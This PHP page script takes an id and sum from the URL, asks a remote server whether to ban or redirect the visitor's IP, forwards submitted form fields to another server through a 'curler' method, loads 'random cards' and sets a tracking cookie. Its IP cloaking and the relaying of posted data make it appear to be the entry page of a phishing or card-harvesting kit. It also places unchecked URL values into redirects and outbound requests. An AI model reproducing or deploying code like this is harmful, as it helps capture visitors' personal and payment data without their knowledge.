<?php
header('Content-Type: text/html; charset=windows-1251');
//echo "<pre>";
//print_r($_GET);
@require_once("class/main.php");
$m=new m();
//echo "<pre>";
//print_r($_COOKIE);
//print_r($_SERVER);
//print_r($_POST);
//print_r($_GET);


if (isset($_GET['id'])) {
  $matches=array();
  foreach ($_GET as $key => $value) {
    $matches[]=$key;
    $matches[]=$value;
  }
  $uid=$matches[1];
  $sum=$matches[2];
  $idsum=$sum;

}else{
  $uid='';
  $sum='';
}

if (!isset($_POST['nocheck'])) {
  $check_ban_redirect=$m->get_server_answer(m::$urlSQLServerPage, 'redirect=2&ban=2&ip='.$_SERVER['REMOTE_ADDR'].'&fxi='.$uid.'&fxs='.$sum);
  //echo $check_ban_redirect;
  if ($check_ban_redirect=='redirect') {
    header('Location: /final.php?id='.$uid);
  }elseif($check_ban_redirect=='ip is banned'){
    die();
  }
}
  



  
  
 if($_POST['termsxxx']){
    $m->check_term($_POST);
   exit;
  }
if($_POST["c1"]){
    if($_COOKIE["rand"]){
        $st = $_COOKIE["rand"];
        $m->genfile($st);
        $m->curler($_POST);
      }
	exit;
}


$params=$m->parseid($_GET);
$ide = explode(",",$params);
$id=$ide[0];
$post_sum = $sum;
$sum = $ide[1];


$getIDtext = $m->getIDtxt($id);
$rcard = $m->getRandcards($id, $idsum);

$chars="qazxswedcvfrtgbnhyujmkiolp1234567890QAZXSWEDCVFRTGBNHYUJMKIOLP";
$max=20;
$size=StrLen($chars)-1;
$password=null;
while($max--)
    $password.=$chars[rand(0,$size)];
 if(!isset($_COOKIE['rand'])) {
   setcookie("rand", $password.time(), time()+3600 );
   $m->insertstat($id,$sum); 
 }

include("them/th1.php");

?>